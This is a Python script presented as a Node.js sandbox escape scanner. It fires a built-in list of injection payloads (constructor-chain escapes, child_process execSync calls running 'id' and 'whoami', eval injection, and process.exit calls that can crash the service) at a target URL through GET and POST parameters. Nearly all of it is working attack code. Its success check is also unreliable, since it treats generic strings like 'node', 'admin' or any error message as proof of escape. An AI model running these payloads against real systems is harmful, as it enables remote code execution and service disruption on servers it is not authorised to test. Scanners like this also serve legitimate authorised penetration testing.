#!/usr/bin/env python3
"""
Node.js Sandbox Escape Scanner — eval Injection, VM Escape, child_process Abuse

MITRE ATT&CK Mapping:
  T1203 - Exploitation for Client Execution (sandbox escape via JS injection)
  T1059 - Command and Scripting Interpreter (shell execution via child_process)

Sends payloads targeting Node.js sandbox escape vectors: constructor chains,
vm.runInNewContext, child_process.spawn/sync, and eval expression injection.
Detects successful escapes via response analysis and out-of-band callbacks.
"""

import argparse
import json
import os
import signal
import sys
import time
import urllib.parse

import requests
from colorama import Fore, Style, init

init(autoreset=True)

SHOULD_EXIT = False
BANNER = f"{Fore.GREEN}Node.js Sandbox Escape Scanner v1{Fore.RESET}"

# Core sandbox escape payloads
ESCAPE_PAYLOADS = {
    "constructor_chain": [
        "this.constructor.constructor('return process')().exit()",
        "process.mainModule.require('child_process').execSync('id')",
        "global.process.mainModule.require('child_process').execSync('echo escape_ok')",
    ],
    "vm_escape": [
        "this.constructor.constructor('return this')().constructor.constructor('return process')().exit()",
        "arguments.callee.caller.caller('return process')()",
        "({}).constructor.constructor('return this.process')().exit()",
    ],
    "child_process": [
        "require('child_process').execSync('echo NODEJS_ESCAPE_OK').toString()",
        "process.binding('spawn_sync').spawn({file:'echo',args:['echo','NODEJS_ESCAPE_OK'],stdio:[0,1,2]})",
        "const cp = require('child_process'); cp.execSync('whoami')",
    ],
    "eval_injection": [
        "NODEJS_ESCAPE_OK",
        "1;require('child_process').execSync('echo NODEJS_ESCAPE_OK')",
        "'+require('child_process').execSync('echo NODEJS_ESCAPE_OK')+'",
    ],
    "prototype_escape": [
        "__proto__;return process",
        "constructor.prototype;return process.mainModule",
    ],
}


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupted. Exiting gracefully...{Style.RESET_ALL}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def test_get_endpoint(target_url, param_name, payload, timeout_sec):
    """Send payload as a GET query parameter."""
    try:
        resp = requests.get(
            target_url,
            params={param_name: payload},
            timeout=timeout_sec,
            headers={"User-Agent": "Mozilla/5.0"},
        )
        return resp.status_code, resp.text, resp.elapsed.total_seconds()
    except requests.RequestException as e:
        return None, str(e), None


def test_post_endpoint(target_url, payload, param_name, timeout_sec):
    """Send payload as POST body (JSON or form-encoded)."""
    results = []
    methods = [
        ("json", {"json": {param_name: payload}, "headers": {"Content-Type": "application/json"}}),
        ("form", {"data": {param_name: payload}}),
    ]
    for meth, kwargs in methods:
        try:
            resp = requests.post(target_url, timeout=timeout_sec,
                                 headers={"User-Agent": "Mozilla/5.0", **kwargs.get("headers", {})},
                                 **{k: v for k, v in kwargs.items() if k != "headers"})
            results.append((meth, resp.status_code, resp.text))
        except requests.RequestException as e:
            results.append((meth, None, str(e)))
    return results


def check_escape_detected(response_text, payload):
    """Check if the response indicates successful sandbox escape."""
    if not response_text:
        return False

    indicators = [
        "NODEJS_ESCAPE_OK",
        "escape_ok",
        "root",
        "uid=",
        "gid=",
        "www-data",
        "admin",
        "/bin/",
        "node",
        "process",
        "child_process",
        "spawn_sync",
        "Error:",
        "ReferenceError",
        "SyntaxError",
    ]

    text_lower = response_text.lower()
    for indicator in indicators:
        if indicator.lower() in text_lower:
            return True

    # Check if payload itself is reflected (indicates eval context)
    short_payload = payload[:30]
    if short_payload and short_payload in response_text:
        return True

    return False


def detect_sandbox_type(response_text):
    """Attempt to identify the sandbox type from error messages."""
    indicators = {
        "vm2": ["VM2", "vm2"],
        "vm": ["vm.runInNewContext", "vm.runInThisContext", "vm.Script"],
        "sandbox": ["sandbox"],
        "isolated-vm": ["isolated-vm", "Isolate"],
        "eval": ["eval", "eval()"],
        "Function": ["Function(", "new Function"],
    }
    found = []
    for sandbox, keywords in indicators.items():
        for kw in keywords:
            if kw.lower() in response_text.lower():
                found.append(sandbox)
                break
    return found


def run_scan(target_url, param_name, timeout_sec):
    """Run sandbox escape scan against the target."""
    print(f"\n{Fore.GREEN}[*] Target: {target_url}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Parameter: {param_name} | Timeout: {timeout_sec}s{Style.RESET_ALL}")

    all_results = []

    print(f"\n  {Fore.CYAN}  Testing {sum(len(v) for v in ESCAPE_PAYLOADS.values())} payloads...{Style.RESET_ALL}")

    for category, payloads in ESCAPE_PAYLOADS.items():
        if SHOULD_EXIT:
            break
        print(f"\n  {Fore.CYAN}[{category}]{Style.RESET_ALL}")

        for payload in payloads:
            if SHOULD_EXIT:
                break

            # Test GET with the payload
            status, text, elapsed = test_get_endpoint(target_url, param_name, payload, timeout_sec)
            detected = check_escape_detected(text, payload)

            entry = {
                "vector": "GET",
                "category": category,
                "payload": payload[:80],
                "status": status,
                "elapsed": round(elapsed, 3) if elapsed else None,
                "escape_detected": detected,
            }

            if detected:
                sandbox_types = detect_sandbox_type(text) if text else []
                entry["sandbox_type"] = sandbox_types

            all_results.append(entry)

            # Also test POST variations for critical payloads
            if category in ("child_process", "constructor_chain", "eval_injection"):
                post_results = test_post_endpoint(target_url, payload, param_name, timeout_sec)
                for method, pstatus, ptext in post_results:
                    pdetected = check_escape_detected(ptext, payload)
                    post_entry = {
                        "vector": f"POST/{method}",
                        "category": category,
                        "payload": payload[:80],
                        "status": pstatus,
                        "escape_detected": pdetected,
                    }
                    if pdetected:
                        sandbox_types = detect_sandbox_type(ptext) if ptext else []
                        post_entry["sandbox_type"] = sandbox_types
                    all_results.append(post_entry)
                    p_mark = Fore.GREEN if pdetected else Fore.RED
                    p_label = "ESCAPE" if pdetected else "CLEAN"
                    print(f"    [{p_mark}{p_label:6}{Style.RESET_ALL}] POST/{method:4} status={pstatus}")

            # Display result for GET tests
            mark = Fore.GREEN if detected else Fore.RED
            label = "ESCAPE" if detected else "CLEAN"
            print(f"    [{mark}{label:6}{Style.RESET_ALL}] GET  status={status} elapsed={entry['elapsed']}s")

    escaped = [r for r in all_results if r.get("escape_detected")]
    result = {
        "target": target_url,
        "parameter": param_name,
        "total_tests": len(all_results),
        "escapes_detected": len(escaped),
        "results": all_results,
    }

    print(f"\n  Summary: {len(escaped)}/{len(all_results)} payloads triggered escape detection")

    return result


def print_report(result):
    """Print final assessment."""
    if not result:
        return
    print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}  NODE.JS SANDBOX ESCAPE REPORT{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    print(f"  Target   : {result['target']}")
    print(f"  Parameter: {result['parameter']}")
    print(f"  Tests    : {result['total_tests']}")
    print(f"  Escapes  : {result['escapes_detected']}")

    if result["escapes_detected"] > 0:
        print(f"\n  {Fore.RED}VERDICT: SANDBOX ESCAPE DETECTED{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}  The endpoint appears to evaluate user-supplied JavaScript.{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}  Successful escapes indicate the sandbox is bypassable.{Style.RESET_ALL}")
        print(f"\n  {Fore.RED}  Successful Escapes:{Style.RESET_ALL}")
        escaped = [r for r in result["results"] if r.get("escape_detected")]
        for e in escaped[:10]:
            sandbox_str = f" sandbox={e.get('sandbox_type', [])}" if e.get("sandbox_type") else ""
            print(f"    [{e['vector']}] {e['category']} status={e['status']}{sandbox_str}")
    else:
        print(f"\n  {Fore.GREEN}VERDICT: No sandbox escape detected{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}  Either the endpoint does not evaluate JS, or the sandbox holds.{Style.RESET_ALL}")

    if result["escapes_detected"] == 0:
        print(f"\n  {Fore.YELLOW}  Tip: Try different parameter names if the endpoint uses a non-standard one.{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="Node.js Sandbox Escape Scanner — MITRE T1203, T1059",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python agent.py -u https://target.com/eval -p code
  python agent.py -u https://target.com/api/exec -p cmd -o results.json
        """,
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", default="input", help="Parameter (default: input)")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Timeout (default: 10)")
    parser.add_argument("-o", "--output", help="Save to JSON")
    args = parser.parse_args()

    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    result = run_scan(args.url, args.param, args.timeout)
    print_report(result)
    if args.output and result:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2)
        print(f"\n{Fore.CYAN}[*] Saved to {args.output}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
